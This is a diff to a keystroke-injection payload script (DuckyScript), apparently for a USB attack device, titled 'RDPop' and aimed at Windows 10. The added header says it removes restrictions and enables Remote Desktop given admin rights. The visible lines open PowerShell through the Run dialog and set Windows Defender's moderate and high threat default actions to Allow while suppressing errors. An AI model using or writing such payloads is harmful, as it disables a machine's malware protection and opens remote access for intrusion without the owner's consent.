@@ -1,3 +1,7 @@
+REM title RDPop
+REM description removes restrictions and enables rdp, if given admin privileges
+REM author C08W38101
+REM target windows 10
 GUI STRING r
 STRING powershell
 ENTER
@@ -30,3 +34,4 @@ ENTER
 STRING Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 ENTER
 STRING Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+CTRL STRING W
